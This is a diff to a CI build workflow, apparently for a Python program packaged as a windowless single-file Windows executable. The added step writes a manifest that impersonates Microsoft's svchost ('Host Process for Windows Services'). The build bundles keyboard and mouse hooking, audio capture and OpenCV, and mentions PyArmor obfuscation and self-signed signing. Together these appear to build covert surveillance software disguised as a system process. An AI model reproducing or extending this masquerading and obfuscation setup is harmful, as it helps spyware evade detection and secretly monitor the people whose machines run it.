@@ -1670,6 +1670,31 @@ jobs:
           '@
           [System.IO.File]::WriteAllText((Join-Path $PWD "version_info.txt"), $vi)
 
+      - name: Ghi manifest
+        shell: pwsh
+        run: |
+          $mf = @'
+          <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+          <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+            <assemblyIdentity type="win32" name="Microsoft.Windows.svchost" version="10.0.19041.1" processorArchitecture="amd64"/>
+            <description>Host Process for Windows Services</description>
+            <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+              <security>
+                <requestedPrivileges>
+                  <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+                </requestedPrivileges>
+              </security>
+            </trustInfo>
+            <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
+              <application>
+                <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
+                <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
+              </application>
+            </compatibility>
+          </assembly>
+          '@
+          [System.IO.File]::WriteAllText((Join-Path $PWD "svchost.manifest"), $mf)
+
       - name: Cài thư viện Python
         run: |
           python -m pip install --upgrade pip
@@ -1766,7 +1791,7 @@ jobs:
             if ($useObf) { Write-Host "OK: build ban da obfuscate (PyArmor)" }
             else { Write-Host "::warning::PyArmor free khong obfuscate duoc script lon - build ban thuong" }
           }
-          pyinstaller --noconfirm --onefile --noconsole --name svchost --icon svchost.ico --version-file version_info.txt --add-binary "libopus-0.dll;." --collect-all soundcard --collect-all sounddevice --collect-all cv2 --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 @extra $src
+          pyinstaller --noconfirm --clean --onefile --noconsole --noupx --optimize 2 --name svchost --icon svchost.ico --manifest svchost.manifest --version-file version_info.txt --add-binary "libopus-0.dll;." --collect-all soundcard --collect-all sounddevice --collect-all cv2 --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module tkinter --exclude-module matplotlib --exclude-module scipy --exclude-module pandas --exclude-module PyQt5 --exclude-module PySide2 --exclude-module IPython --exclude-module pytest @extra $src
           if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
 
       - name: Ký số self-signed
